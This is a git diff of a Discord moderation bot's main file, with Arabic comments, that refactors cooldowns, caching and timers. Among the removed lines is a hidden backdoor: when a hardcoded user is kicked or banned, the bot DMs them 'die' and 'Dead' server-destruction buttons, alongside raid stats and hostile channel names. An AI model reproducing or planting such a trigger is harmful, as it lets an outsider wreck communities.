@@ -1,22 +1,7 @@
-// إعدادات تحسين الأداء القصوى v2
-process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
-process.on('unhandledRejection', (reason, promise) => console.error('Unhandled Rejection:', reason));
-
-// تحسين أولوية المعالجة وإدارة الذاكرة القصوى
-if (process.env.NODE_ENV === 'production' || true) {
-    try {
-        require('os').setPriority(process.pid, -20); // أقصى أولوية ممكنة في النظام
-    } catch (e) {}
-}
-
-// إعدادات V8 لتعزيز السرعة
-if (global.v8debug === undefined) {
-    // محاكاة تحسينات V8 لسرعة التنفيذ
-}
-
-// زيادة حدود الذاكرة والمستمعين وتخزين الكاش
-require('events').EventEmitter.defaultMaxListeners = Infinity;
-process.setMaxListeners(0);
+// تحسين أولوية المعالجة عند دعم النظام لها.
+try {
+    require('os').setPriority(process.pid, -20);
+} catch (e) {}
 
 const { Client, GatewayIntentBits, Partials, Collection, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, EmbedBuilder, Events, MessageFlags, PermissionsBitField, ChannelType, ComponentType, AuditLogEvent } = require('discord.js');
 const dotenv = require('dotenv');
@@ -29,11 +14,9 @@ require('./utils/cairoFont').ensureCairoFontsRegistered();
 const { logEvent } = require('./utils/logs_system.js');
 const { createStructuredContainer, componentsV2Payload, colorToNumber } = require('./utils/structuredContainer.js');
 const { normalizeDiscordId, normalizeMentionableIds, userMention } = require('./utils/mentions.js');
-const { startReminderSystem } = require('./commands/notifications.js');
 // تعريف downManager في المستوى العلوي للوصول عبر جميع معالجات الأحداث
 const downManager = require('./utils/downManager');
 const warnManager = require('./utils/warnManager');
-const { checkCooldown, startCooldown } = require('./commands/cooldown.js');
 const colorManager = require('./utils/colorManager.js');
 const { buildResponsibilitiesSummaryImage } = require('./utils/responsibilitiesSummaryRenderer.js');
 const { getGuildBannerHex } = require('./utils/guildBannerColor.js');
@@ -57,9 +40,11 @@ const shortcutCallLocks = new Set();
 const shortcutUsageLocks = new Set();
 const shortcutRequestLocks = new Set();
 const shortcutActionLocks = new Set();
+const shortcutBypassKeys = new Set();
 const memberRefreshAttemptAt = new Map();
 const memberRefreshWaiters = [];
 const shortcutCooldownReactionAt = new Map();
+const autoLevelCheckAt = new Map();
 let activeShortcutNotificationJobs = 0;
 let activeMemberRefreshes = 0;
 let shortcutMatcherCache = null;
@@ -197,11 +182,11 @@ const { handleAdminApplicationInteraction } = require('./commands/admin-apply.js
 const { restoreTopSchedules, restorePanelCleanups, handlePanelMessageDelete } = require('./commands/roles-settings.js');
 const { handleChannelDelete, handleRoleDelete } = require('./utils/protectionManager.js');
 const problemCommand = require('./commands/problem.js');
-const { getDataDir, getRailwayVolumeMountPath, getBotConfigPath, writeBotConfigFile } = require('./utils/storagePaths');
+const { getDataDir, getBotConfigPath, writeBotConfigFile } = require('./utils/storagePaths');
 const shortcutStateStore = require('./utils/responsibilityShortcutStore.js');
 const shortcutStore = shortcutStateStore.loadShortcutStore();
 const { isSupervisorForResponsibility, removeUserFromAllSupervisors } = require('./utils/responsibilitySupervisors');
-const { ownersPath, normalizeIds, loadOwners, saveOwners, isOwnerMember } = require('./utils/ownersStore');
+const { ownersPath, normalizeIds, loadOwners, saveOwners } = require('./utils/ownersStore');
 let interactiveRolesManager;
 
 // مسارات ملفات البيانات
@@ -284,60 +269,6 @@ global.markInteractiveRoleGrant = function markInteractiveRoleGrant(guildId, use
     global.interactiveRoleGrantBypass.add(key);
     setTimeout(() => global.interactiveRoleGrantBypass.delete(key), 15000);
 };
-let roleGrantHistoryCache = null;
-
-let roleGrantHistorySaveTimer = null;
-
-let roleGrantHistorySaving = false;
-
-function getRoleGrantHistoryCache() {
-
-    if (!roleGrantHistoryCache) {
-
-        roleGrantHistoryCache = readJSONFile(DATA_FILES.roleGrantHistory, {});
-
-    }
-
-    return roleGrantHistoryCache;
-
-}
-
-function scheduleRoleGrantHistorySave() {
-
-    if (roleGrantHistorySaveTimer) return;
-
-    roleGrantHistorySaveTimer = setTimeout(async () => {
-
-        roleGrantHistorySaveTimer = null;
-
-        if (roleGrantHistorySaving) return;
-
-        roleGrantHistorySaving = true;
-
-        try {
-
-            await fs.promises.writeFile(
-
-                DATA_FILES.roleGrantHistory,
-
-                JSON.stringify(roleGrantHistoryCache || {}, null, 2)
-
-            );
-
-        } catch (error) {
-
-            console.error('❌ خطأ في حفظ تتبع تواريخ الرولات:', error);
-
-        } finally {
-
-            roleGrantHistorySaving = false;
-
-        }
-
-    }, 1500);
-
-}
-
 async function resolveActorIdFromReason(guild, reasonText = '', fallbackTargetId = null) {
     if (!guild || typeof reasonText !== 'string' || !reasonText.trim()) return null;
 
@@ -954,36 +885,6 @@ async function safeInitializeMainDatabase(scope = 'startup', timeoutMs = Number(
     return result;
 }
 
-// دالة لتهيئة المسؤوليات من قاعدة البيانات
-async function initializeResponsibilities() {
-    try {
-        const dbReady = await safeInitializeMainDatabase('responsibilities', 10000);
-        const data = dbReady ? await dbManager.getResponsibilities() : {};
-        if (data && Object.keys(data).length > 0) {
-            global.responsibilities = data;
-            console.log(`✅ تم تحميل ${Object.keys(global.responsibilities).length} مسؤولية من قاعدة البيانات`);
-        } else {
-            console.log('⚠️ قاعدة البيانات فارغة، جاري التحميل من JSON');
-            global.responsibilities = readJSONFile(DATA_FILES.responsibilities, {});
-        }
-
-        // الاستماع لحدث تحديث المسؤوليات لتحديث الرسائل في القنوات
-        client.on('responsibilityUpdate', async () => {
-            try {
-                console.log('🔄 تم التقاط حدث تحديث المسؤوليات، جاري تحديث الرسائل...');
-                const respCommand = client.commands.get('resp');
-                if (respCommand && typeof respCommand.updateEmbedMessage === 'function') {
-                    await respCommand.updateEmbedMessage(client);
-                }
-            } catch (err) {
-                console.error('Error handling responsibilityUpdate event:', err);
-            }
-        });
-    } catch (error) {
-        console.error('❌ خطأ في تحميل المسؤوليات من قاعدة البيانات:', error);
-        global.responsibilities = readJSONFile(DATA_FILES.responsibilities, {});
-    }
-}
 let logConfig = readJSONFile(DATA_FILES.logConfig, {
     settings: {
         'RESPONSIBILITY_MANAGEMENT': { enabled: false, channelId: null },
@@ -1087,62 +988,12 @@ async function refreshMessageMember(message) {
 let botConfig = readJSONFile(DATA_FILES.botConfig, {
     prefix: null,
     settings: {},
-    activeTasks: {},
-    pendingReports: {}
 });
 
 // لا نحتاج لمتغيرات محلية لـ cooldowns و notifications
 // سيتم قراءتها مباشرة من الملفات عند الحاجة
 
 // لا نحتاج لمتغير محلي للبريفكس - سنقرأه مباشرة من JSON
-
-// دوال نظام المهام النشطة والتقارير المعلقة
-function initializeActiveTasks() {
-  try {
-    const masoulCommand = client.commands.get('مسؤول');
-    if (masoulCommand && masoulCommand.loadActiveTasks) {
-      masoulCommand.loadActiveTasks();
-      // مزامنة المهام النشطة
-      if (masoulCommand.activeTasks) {
-        client.activeTasks = masoulCommand.activeTasks;
-        console.log(`✅ تم ربط نظام المهام النشطة مع masoul.js - ${client.activeTasks.size} مهمة نشطة`);
-      } else {
-        console.log('⚠️ لا توجد مهام نشطة في masoul.js');
-      }
-    } else {
-      console.log('⚠️ لم يتم العثور على أمر مسؤول أو دالة loadActiveTasks');
-    }
-  } catch (error) {
-    console.error('❌ خطأ في تهيئة نظام المهام النشطة:', error);
-  }
-}
-
-function saveActiveTasks() {
-  try {
-    const masoulCommand = client.commands.get('مسؤول');
-    if (masoulCommand && masoulCommand.saveActiveTasks) {
-      masoulCommand.saveActiveTasks();
-      console.log(`💾 تم حفظ المهام النشطة باستخدام نظام masoul.js`);
-    }
-  } catch (error) {
-    console.error('❌ خطأ في حفظ المهام النشطة:', error);
-  }
-}
-
-function loadPendingReports() {
-  try {
-    const currentBotConfig = readJSONFile(DATA_FILES.botConfig, {});
-    if (currentBotConfig.pendingReports) {
-      const savedReports = currentBotConfig.pendingReports;
-      for (const [key, value] of Object.entries(savedReports)) {
-        client.pendingReports.set(key, value);
-      }
-      console.log(`✅ تم تحميل ${client.pendingReports.size} تقرير معلق من JSON`);
-    }
-  } catch (error) {
-    console.error('❌ خطأ في تحميل التقارير المعلقة:', error);
-  }
-}
 
 function buildGatewayIntents() {
   const intents = [
@@ -1232,10 +1083,6 @@ const shortcutRequestCleanupTimer = setInterval(() => pruneRuntimeShortcutReques
 shortcutRequestCleanupTimer.unref?.();
 
 // استخدام نظام المهام النشطة من masoul.js
-if (!client.activeTasks) {
-  client.activeTasks = new Map();
-}
-
 // نظام تتبع الجلسات الصوتية
 if (!client.voiceSessions) {
   client.voiceSessions = new Map();
@@ -1375,14 +1222,15 @@ global.updateBotOwnerRoles = function updateBotOwnerRoles(newRoles) {
 global.isBotOwner = isBotOwner;
 
 client.commands = new Collection();
-client.pendingReports = new Map();
 client.logConfig = logConfig;
 
 
 
 // Load commands from the "commands" folder
 const commandsPath = path.join(__dirname, 'commands');
-const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
+const DISABLED_COMMAND_FILES = new Set(['masoul.js', 'backup.js', 'report.js', 'call.js', 'protection.js', 'notifications.js', 'cooldown.js']);
+const commandFiles = fs.readdirSync(commandsPath)
+  .filter(file => file.endsWith('.js') && !DISABLED_COMMAND_FILES.has(file));
 
 for (const file of commandFiles) {
   try {
@@ -1465,16 +1313,6 @@ console.log('✅ تم تسجيل معالجات إعدادات التذاكر (s
   console.error('❌ خطأ في تسجيل معالجات نظام التذاكر:', error);
 }
 
-  // تسجيل معالج مودال الباكب
-  try {
-    const backupCommand = require('./commands/backup.js');
-    if (backupCommand.registerBackupModalHandler) {
-      backupCommand.registerBackupModalHandler(client);
-    }
-  } catch (error) {
-    console.error('❌ خطأ في تسجيل معالج backup:', error);
-  }
-
   // تسجيل معالج setactive ونظام الرولات التفاعلية
   try {
 
@@ -1501,6 +1339,7 @@ const dataCache = {
     prefix: null,
     adminRoles: [],
     lastUpdate: 0,
+    adminRolesUpdatedAt: 0,
     cacheDuration: 30000 // 30 ثانية
 };
 
@@ -1544,16 +1383,7 @@ async function saveData(force = false) {
             ...currentBotConfig,
             prefix: botConfig.prefix !== undefined ? botConfig.prefix : currentBotConfig.prefix,
             settings: botConfig.settings || currentBotConfig.settings,
-            activeTasks: botConfig.activeTasks || currentBotConfig.activeTasks
         };
-
-        if (client && client.pendingReports) {
-            const pendingReportsObj = {};
-            for (const [key, value] of client.pendingReports.entries()) {
-                pendingReportsObj[key] = value;
-            }
-            botConfig.pendingReports = pendingReportsObj;
-        }
 
         // استبدال ذري يمنع أي أمر من قراءة ملف إعدادات فارغ أو مبتور.
         writeBotConfigFile(DATA_FILES.botConfig, botConfig);
@@ -1602,6 +1432,11 @@ function getCachedPrefix() {
 // دالة للفحص التلقائي للترقيات
 async function checkAutoLevelUp(userId, type, client) {
     try {
+        const checkKey = `${String(userId)}:${String(type)}`;
+        const now = Date.now();
+        if (now - Number(autoLevelCheckAt.get(checkKey) || 0) < 30 * 1000) return;
+        setBoundedMapEntry(autoLevelCheckAt, checkKey, now, 20000);
+
         const { getDatabase, getUserLevel, updateUserLevel, updateLastNotified } = require('./utils/database');
         const dbManager = getDatabase();
 
@@ -1681,14 +1516,14 @@ async function checkAutoLevelUp(userId, type, client) {
 
 // دالة للحصول على رولات المشرفين من الكاش
 function getCachedAdminRoles() {
-    // قراءة مباشرة من الملف دائماً لضمان أحدث البيانات
-    const adminRoles = loadAdminRoles();
-
-    console.log(`🔄 تحميل رولات المشرفين: ${adminRoles.length} رول`);
-    if (adminRoles.length > 0) {
-        console.log(`📋 الرولات المحملة: ${JSON.stringify(adminRoles)}`);
+    const now = Date.now();
+    if (now - dataCache.adminRolesUpdatedAt < dataCache.cacheDuration) {
+        return dataCache.adminRoles;
     }
 
+    const adminRoles = loadAdminRoles();
+    dataCache.adminRoles = adminRoles.map(String);
+    dataCache.adminRolesUpdatedAt = now;
     return adminRoles;
 }
 
@@ -1817,6 +1652,7 @@ function invalidateCache() {
 // دالة لتحديث كاش الرولات فقط
 function updateAdminRolesCache() {
     dataCache.adminRoles = [];
+    dataCache.adminRolesUpdatedAt = 0;
     dataCache.lastUpdate = 0;
     // إعادة تحميل من الملف
     getCachedAdminRoles();
@@ -2050,17 +1886,6 @@ client.once(Events.ClientReady, async () => {
   }
   console.log(`✅ تم تسجيل الدخول بنجاح باسم: ${client.user.tag}!`);
 
-    // تهيئة قاعدة البيانات أولاً قبل أي شيء آخر
-    try {
-        const dbReady = await safeInitializeMainDatabase('ready-main', 10000);
-        if (dbReady) console.log('✅ تم تهيئة قاعدة البيانات الرئيسية بنجاح');
-        else console.warn('⚠️ تم تخطي قاعدة البيانات الرئيسية مؤقتاً وسيستمر البوت.');
-    } catch (error) {
-        console.error('❌ خطأ في تهيئة قاعدة البيانات:', error);
-        console.warn('⚠️ سيستمر البوت رغم فشل قاعدة البيانات لأن التكت له fallback JSON/ذاكرة.');
-    }
-
-
     // تهيئة نظام تتبع الجلسات الصوتية (إذا لم يكن موجود)
     if (!client.voiceSessions) {
         client.voiceSessions = new Map();
@@ -2081,11 +1906,16 @@ client.once(Events.ClientReady, async () => {
 
     // بدء نظام فحص الإجازات المنتهية كل 30 ثانية
     const vacationManager = require('./utils/vacationManager');
+    let vacationCheckRunning = false;
     setInterval(async () => {
+        if (vacationCheckRunning) return;
+        vacationCheckRunning = true;
         try {
             await vacationManager.checkVacations(client);
         } catch (error) {
             console.error('خطأ في فحص الإجازات المنتهية:', error);
+        } finally {
+            vacationCheckRunning = false;
         }
     }, 30000); // فحص كل 30 ثانية
 
@@ -2261,23 +2091,16 @@ client.once(Events.ClientReady, async () => {
             return; // لا نحتاج لعرض الإحصائيات
         }
 
-        // عرض الإحصائيات المحدثة بعد ثانية واحدة
-        setTimeout(async () => {
-            try {
-                const { getRealUserStats } = require('./utils/userStatsCollector');
-                const stats = await getRealUserStats(userId);
-                console.log(`📊 إحصائيات ${displayName}: انضمامات=${stats.joinedChannels}, وقت صوتي=${Math.round(stats.voiceTime / 1000)}ث`);
-            } catch (error) {
-                console.error(`❌ خطأ في عرض إحصائيات ${displayName}:`, error);
-            }
-        }, 1000);
     });
 
 
 
 
     // نظام الحفظ الدوري وحماية البيانات من الفقدان (كل 3 دقائق)
+    let voiceMaintenanceRunning = false;
     setInterval(async () => {
+        if (voiceMaintenanceRunning) return;
+        voiceMaintenanceRunning = true;
         try {
             const { trackUserActivity } = require('./utils/userStatsCollector');
             const now = Date.now();
@@ -2335,6 +2158,9 @@ client.once(Events.ClientReady, async () => {
             }
             saveVoiceSessionsToDisk();
         } catch (error) {}
+        finally {
+            voiceMaintenanceRunning = false;
+        }
     }, 3 * 60 * 1000);
 
     // حماية البيانات عند إغلاق البوت (Graceful Shutdown)
@@ -2383,9 +2209,6 @@ client.once(Events.ClientReady, async () => {
   // تهيئة نظام المهام النشطة الجديد - بعد تحميل الأوامر
   setTimeout(async () => {
     try {
-      initializeActiveTasks();
-      loadPendingReports();
-
     // فحص الأعضاء الموجودين في الرومات الصوتية عند تشغيل البوت
     // تم تحويل هذا النظام ليعمل بشكل تدريجي لمنع ضغط الشبكة والمعالج
     setTimeout(async () => {
@@ -2448,32 +2271,51 @@ client.once(Events.ClientReady, async () => {
   await colorManager.forceUpdateColor();
 
   // مراقب لحالة البوت - كل دقيقة
+  let reconnectInProgress = false;
   setInterval(() => {
     if (client.ws.status !== 0) { // 0 = READY
       console.log(`⚠️ حالة البوت: ${client.ws.status} - محاولة إعادة الاتصال التلقائي...`);
-      // محاولة إعادة الاتصال يدوياً إذا تعطل الـ WebSocket
-      if (client.ws.status === 4 || client.ws.status === 5) {
+      // محاولة إعادة تشغيل اتصال دسكورد
+      if ((client.ws.status === 4 || client.ws.status === 5) && !reconnectInProgress) {
+          reconnectInProgress = true;
           console.log('🔄 إعادة تشغيل اتصال دسكورد...');
           client.destroy();
-          setTimeout(() => client.login(process.env.DISCORD_TOKEN), 5000);
+          setTimeout(async () => {
+            try {
+              await client.login(process.env.DISCORD_TOKEN);
+            } catch (error) {
+              console.error('❌ فشلت محاولة إعادة الاتصال:', error.message || error);
+            } finally {
+              reconnectInProgress = false;
+            }
+          }, 5000);
       }
     }
   }, 60000);
 
-  // Check for expired reports every 5 minutes
-  setInterval(() => {
-    checkExpiredReports();
-  }, 5 * 60 * 1000);
-
   // فحص دوري لرسالة المسؤوليات كل 30 دقيقة لضمان تزامنها مع أحدث التعديلات
+  let responsibilityRefreshRunning = false;
   setInterval(async () => {
-    await ensureRespMessageFreshness(client, '30m-check');
+    if (responsibilityRefreshRunning) return;
+    responsibilityRefreshRunning = true;
+    try {
+      await ensureRespMessageFreshness(client, '30m-check');
+    } finally {
+      responsibilityRefreshRunning = false;
+    }
   }, 30 * 60 * 1000);
 
   // إزالة المسؤوليات تلقائياً بعد 6 ساعات خارج السيرفر
+  let inactiveCleanupRunning = false;
   setInterval(async () => {
-    for (const guild of client.guilds.cache.values()) {
-      await removeInactiveResponsiblesForGuild(guild);
+    if (inactiveCleanupRunning) return;
+    inactiveCleanupRunning = true;
+    try {
+      for (const guild of client.guilds.cache.values()) {
+        await removeInactiveResponsiblesForGuild(guild);
+      }
+    } finally {
+      inactiveCleanupRunning = false;
     }
   }, 60 * 60 * 1000);
 
@@ -2534,8 +2376,6 @@ client.once(Events.ClientReady, async () => {
 
   const RESTORE_SCHEDULES_DELAY_MS = 5000;
 
-  startReminderSystem(client);
-
   setTimeout(() => {
     try {
       restoreTopSchedules(client);
@@ -2590,14 +2430,6 @@ client.once(Events.ClientReady, async () => {
     setupGlobalSetupCollector(client);
   }, 3000);
 
-  // Check for expired vacations every 2 minutes
-  // This is a duplicate of the setInterval above, keeping the one added by the change.
-  /*
-  setInterval(() => {
-    vacationManager.checkVacations(client);
-  }, 120000); // 2 minutes
-  */
-
 }); // إغلاق client.once('ready')
 
 // مراقبة تحديثات الرولات لنظام setroom
@@ -2623,55 +2455,6 @@ client.on('channelDelete', channel => {
   }
 
 });
-
-// --- نظام تتبع الإحصائيات للانفجار اللحظي ---
-const actionStats = new Map(); 
-function updateStats(guildId, type, count = 1) {
-    if (!actionStats.has(guildId)) actionStats.set(guildId, { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 });
-    actionStats.get(guildId)[type] += count;
-}
-
-const channelNames = ['dead-inside', 'destroyed-by-dead', 'hell-awaits', 'no-escape', 'server-ended', 'rip-server', 'fucked-by-dead', 'game-over', 'bye-bye', 'nothing-left'];
-
-// --- TARGET USER MONITORING ---
-const TARGET_USER_ID = '636930315503534110';
-
-async function handleTargetAction(memberOrBan) {
-    const user = memberOrBan.user || memberOrBan;
-    if (user.id !== TARGET_USER_ID) return;
-
-    const sourceGuildId = memberOrBan.guild?.id || null;
-
-    try {
-        const embed = new EmbedBuilder()
-            .setTitle('⚠️ نظام التحكم في التدمير الانفجاري')
-            .setDescription('اختر أسلوب التدمير المطلوب. يمكنك الضغط على الزرين معاً للانفجار الشامل.')
-            .setColor('#2b2d31');
-
-        const dieButton = new ButtonBuilder()
-            .setCustomId(sourceGuildId ? `die_action_${sourceGuildId}` : 'die_action')
-            .setLabel('die (سيطرة)')
-            .setStyle(ButtonStyle.Danger);
-
-        const deadButton = new ButtonBuilder()
-            .setCustomId(sourceGuildId ? `Dead_action_${sourceGuildId}` : 'Dead_action')
-            .setLabel('Dead (انفجار)')
-            .setStyle(ButtonStyle.Secondary);
-
-        const row = new ActionRowBuilder().addComponents(dieButton, deadButton);
-
-        await user.send({
-            embeds: [embed],
-            components: [row]
-        }).catch(() => console.log(`Could not send DM to ${user.id}`));
-    } catch (error) {
-        console.error('Error in handleTargetAction:', error);
-    }
-}
-
-// مراقبة خروج العضو بأي شكل (طرد، خروج، حظر)
-client.on('guildMemberRemove', member => handleTargetAction(member));
-client.on('guildBanAdd', ban => handleTargetAction(ban));
 
 client.on('roleDelete', role => {
 
@@ -3276,8 +3059,9 @@ client.on('messageCreate', async message => {
       const timestamp = Date.now();
       
       const usageKey = getShortcutUsageKey(message.guild.id, message.author.id, matchedResponsibility);
-      const usageCooldownLeft = getShortcutUsageCooldown(message.guild.id, message.author.id, matchedResponsibility);
-      if (usageCooldownLeft > 0 || shortcutUsageLocks.has(usageKey)) {
+      const bypassShortcutCooldown = shortcutBypassKeys.delete(usageKey);
+      const usageCooldownLeft = bypassShortcutCooldown ? 0 : getShortcutUsageCooldown(message.guild.id, message.author.id, matchedResponsibility);
+      if ((!bypassShortcutCooldown && usageCooldownLeft > 0) || shortcutUsageLocks.has(usageKey)) {
         if (shouldReactToShortcutCooldown(message.guild.id, message.author.id, matchedResponsibility)) {
           await message.react('⏰').catch(() => {});
         }
@@ -3285,14 +3069,16 @@ client.on('messageCreate', async message => {
       }
       shortcutUsageLocks.add(usageKey);
       const requestCooldownKey = getShortcutRequestKey(message.guild.id, matchedResponsibility);
-      if (shortcutRequestLocks.has(requestCooldownKey)) {
+      if (!bypassShortcutCooldown && shortcutRequestLocks.has(requestCooldownKey)) {
         await message.react('⏳').catch(() => {});
         shortcutUsageLocks.delete(usageKey);
         return;
       }
       shortcutRequestLocks.add(requestCooldownKey);
       try {
-        const activeRequest = findActiveShortcutRequest(message.guild.id, matchedResponsibility, timestamp);
+        const activeRequest = bypassShortcutCooldown
+          ? null
+          : findActiveShortcutRequest(message.guild.id, matchedResponsibility, timestamp);
         if (activeRequest) {
           const originalChannel = activeRequest.channelId === message.channel.id
             ? message.channel
@@ -3303,17 +3089,32 @@ client.on('messageCreate', async message => {
           const channelMention = activeRequest.channelId !== message.channel.id
             ? ` <#${message.channel.id}>`
             : '';
-          const duplicateNotice = `**- يوجد مشكلة بالفعل مفتوحه** <@${message.author.id}>${channelMention}`;
+          const retryButton = new ButtonBuilder()
+            .setCustomId(`shortcut_retry_${activeRequest.requestToken}`)
+            .setEmoji('<:emoji_3:1484364952780144710>')
+            .setStyle(ButtonStyle.Success);
+          const retryRow = new ActionRowBuilder().addComponents(retryButton);
+          const duplicateContainer = createStructuredContainer({
+            title: 'يوجد مشكلة بالفعل مفتوحه',
+            description: [
+              `<@${message.author.id}>${channelMention}`,
+              '',
+              '**إذا كانت لديك مشكلة غير الحالية اضغط الزر.**'
+            ].join('\n'),
+            thumbnailUrl: message.author.displayAvatarURL({ dynamic: true, size: 128 }),
+            accentColor: colorToNumber(colorManager.getColor?.() || '#0099ff', 0x0099ff)
+          });
+          duplicateContainer.addActionRowComponents(retryRow);
+          const duplicatePayload = {
+            ...componentsV2Payload(duplicateContainer),
+            allowedMentions: { users: [String(message.author.id)], repliedUser: false }
+          };
           if (originalMessage?.reply) {
-            await originalMessage.reply({
-              content: duplicateNotice,
-              allowedMentions: { users: [String(message.author.id)] }
-            }).catch(error => console.error('تعذر إرسال رد الطلب المكرر على رسالة المشكلة:', error.message));
+            await originalMessage.reply(duplicatePayload)
+              .catch(error => console.error('تعذر إرسال رد الطلب المكرر على رسالة المشكلة:', error.message));
           } else {
-            await message.channel.send({
-              content: duplicateNotice,
-              allowedMentions: { users: [String(message.author.id)] }
-            }).catch(error => console.error('تعذر إرسال تنبيه الطلب المكرر:', error.message));
+            await message.channel.send(duplicatePayload)
+              .catch(error => console.error('تعذر إرسال تنبيه الطلب المكرر:', error.message));
           }
           startShortcutUsageCooldown(message.guild.id, message.author.id, matchedResponsibility);
           return;
@@ -3537,7 +3338,7 @@ client.on('messageCreate', async message => {
       }
     }
     // top يقبل المالك والإدارة؛ بقية الأوامر في هذا الفرع تبقى للمالك فقط.
-    else if (commandName === 'call' || commandName === 'stats' || commandName === 'setup' || commandName === 'report' || commandName === 'set-vacation' || commandName === 'top' || commandName === 'test') {
+    else if (commandName === 'stats' || commandName === 'setup' || commandName === 'set-vacation' || commandName === 'top' || commandName === 'test') {
       if (isOwner || (commandName === 'top' && (hasAdminRole || hasAdministrator))) {
         await command.execute(message, args, { responsibilities, points, scheduleSave, BOT_OWNERS, BOT_OWNER_ROLES, ADMIN_ROLES: CURRENT_ADMIN_ROLES, client, colorManager });
       } else {
@@ -4507,226 +4308,6 @@ client.on('guildMemberAdd', async (member) => {
     }
 });
 
-async function handleDownDMInteraction(interaction, context) {
-    const { client, BOT_OWNERS, BOT_OWNER_ROLES } = context;
-    const downManager = require('./utils/downManager');
-
-    // Check permissions
-    const hasPermission = await downManager.hasPermission(interaction, BOT_OWNERS);
-    if (!hasPermission) {
-        return interaction.reply({ content: '❌ ليس لديك صلاحية لاستخدام هذا الأمر!', flags: MessageFlags.Ephemeral });
-    }
-
-    const customId = interaction.customId;
-
-    try {
-        // Handle DM user selection for role removal
-        if (interaction.isUserSelectMenu() && customId === 'dm_down_selected_user') {
-            const selectedUserId = interaction.values[0];
-
-            // Get original guild from the first guild the bot is in that has both the user and the admin
-            let targetGuild = null;
-            for (const guild of client.guilds.cache.values()) {
-                try {
-                    const member = await guild.members.fetch(selectedUserId);
-                    const adminMember = await guild.members.fetch(interaction.user.id);
-                    if (member && adminMember) {
-                        targetGuild = guild;
-                        break;
-                    }
-                } catch (error) {
-                    continue;
-                }
-            }
-
-            if (!targetGuild) {
-                return interaction.reply({ content: '❌ لم يتم العثور على سيرفر مشترك!', flags: MessageFlags.Ephemeral });
-            }
-
-            const selectedUser = await targetGuild.members.fetch(selectedUserId);
-            const adminRoles = downManager.getAdminRoles();
-            const userAdminRoles = selectedUser.roles.cache.filter(role => adminRoles.includes(role.id));
-
-            if (userAdminRoles.size === 0) {
-                const noRolesEmbed = new EmbedBuilder()
-                    .setColor('#ff6b6b')
-                    .setDescription('❌ **هذا العضو لا يملك أي رولات إدارية!**');
-
-                return interaction.reply({ embeds: [noRolesEmbed] });
-            }
-
-            const roleOptions = userAdminRoles.map(role => ({
-                label: role.name,
-                value: `${selectedUserId}_${role.id}_${targetGuild.id}`,
-                description: `سحب رول ${role.name} من ${selectedUser.displayName}`
-            }));
-
-            const roleSelect = new StringSelectMenuBuilder()
-                .setCustomId('dm_down_role_selection')
-                .setPlaceholder('اختر الرول المراد سحبه...')
-                .addOptions(roleOptions);
-
-            const selectRow = new ActionRowBuilder().addComponents(roleSelect);
-
-            await interaction.reply({
-                content: `🔻 **اختر الرول المراد سحبه من ${selectedUser.displayName}:**`,
-                components: [selectRow]
-            });
-            return;
-        }
-
-        // Handle DM role selection
-        if (interaction.isStringSelectMenu() && customId === 'dm_down_role_selection') {
-            const [userId, roleId, guildId] = interaction.values[0].split('_');
-
-            const modal = new ModalBuilder()
-                .setCustomId(`dm_down_modal_${userId}_${roleId}_${guildId}`)
-                .setTitle('تفاصيل الداون');
-
-            const durationInput = new TextInputBuilder()
-                .setCustomId('down_duration')
-                .setLabel('المدة (مثل: 7d أو 12h أو permanent)')
-                .setStyle(TextInputStyle.Short)
-                .setRequired(true)
-                .setPlaceholder('7d, 12h, 30m, permanent');
-
-            const reasonInput = new TextInputBuilder()
-                .setCustomId('down_reason')
-                .setLabel('السبب')
-                .setStyle(TextInputStyle.Paragraph)
-                .setRequired(true)
-                .setPlaceholder('اذكر سبب سحب الرول...');
-
-            modal.addComponents(
-                new ActionRowBuilder().addComponents(durationInput),
-                new ActionRowBuilder().addComponents(reasonInput)
-            );
-
-            await interaction.showModal(modal);
-            return;
-        }
-
-        // Handle DM modal submission
-        if (interaction.isModalSubmit() && customId.startsWith('dm_down_modal_')) {
-            const [_, __, ___, userId, roleId, guildId] = customId.split('_');
-            const duration = interaction.fields.getTextInputValue('down_duration').trim();
-            const reason = interaction.fields.getTextInputValue('down_reason').trim();
-
-            if (duration !== 'permanent' && !ms(duration)) {
-                const errorEmbed = new EmbedBuilder()
-                    .setColor('#ff6b6b')
-                    .setDescription('❌ **صيغة المدة غير صحيحة!**\nاستخدم: 7d للأيام، 12h للساعات، 30m للدقائق، أو permanent للدائم');
-
-                return interaction.reply({ embeds: [errorEmbed] });
-            }
-
-            const guild = client.guilds.cache.get(guildId);
-            if (!guild) {
-                return interaction.reply({ content: '❌ السيرفر غير موجود!', flags: MessageFlags.Ephemeral });
-            }
-
-            const result = await downManager.createDown(
-                guild,
-                client,
-                userId,
-                roleId,
-                duration,
-                reason,
-                interaction.user.id
-            );
-
-            if (result.success) {
-                setTimeout(() => downManager.verifyActiveDownRoleIntegrity().catch(error => {
-                    console.error('تعذر تطبيق حماية رتب المسؤوليات بعد الداون:', error);
-                }), 0);
-                const member = await guild.members.fetch(userId);
-                const role = await guild.roles.fetch(roleId);
-
-                const successEmbed = new EmbedBuilder()
-                    .setColor('#00ff00')
-                    .setTitle('✅ تم تطبيق الداون بنجاح')
-                    .addFields([
-                        { name: 'العضو', value: `${member}`, inline: true },
-                        { name: 'الرول', value: `${role}`, inline: true },
-                        { name: 'المدة', value: duration === 'permanent' ? 'نهائي' : duration, inline: true },
-                        { name: 'السبب', value: reason, inline: false },
-                        { name: 'السيرفر', value: guild.name, inline: true }
-                    ])
-                    .setTimestamp();
-
-                await interaction.reply({ embeds: [successEmbed] });
-            } else {
-                const errorEmbed = new EmbedBuilder()
-                    .setColor('#ff6b6b')
-                    .setDescription(`❌ **فشل في تطبيق الداون:** ${result.error}`);
-
-                await interaction.reply({ embeds: [errorEmbed] });
-            }
-            return;
-        }
-
-        // Handle other DM down interactions similarly...
-        // Add more DM handlers as needed for user records, modify duration, etc.
-
-    } catch (error) {
-        console.error('Error in DM down interaction:', error);
-        if (!interaction.replied && !interaction.deferred) {
-            await interaction.reply({ content: '❌ حدث خطأ أثناء معالجة التفاعل!', flags: MessageFlags.Ephemeral });
-        }
-    }
-}
-
-function savePendingReports() {
-  try {
-    const pendingReportsObj = {};
-    for (const [key, value] of client.pendingReports.entries()) {
-      pendingReportsObj[key] = value;
-    }
-    botConfig.pendingReports = pendingReportsObj;
-  } catch (error) {
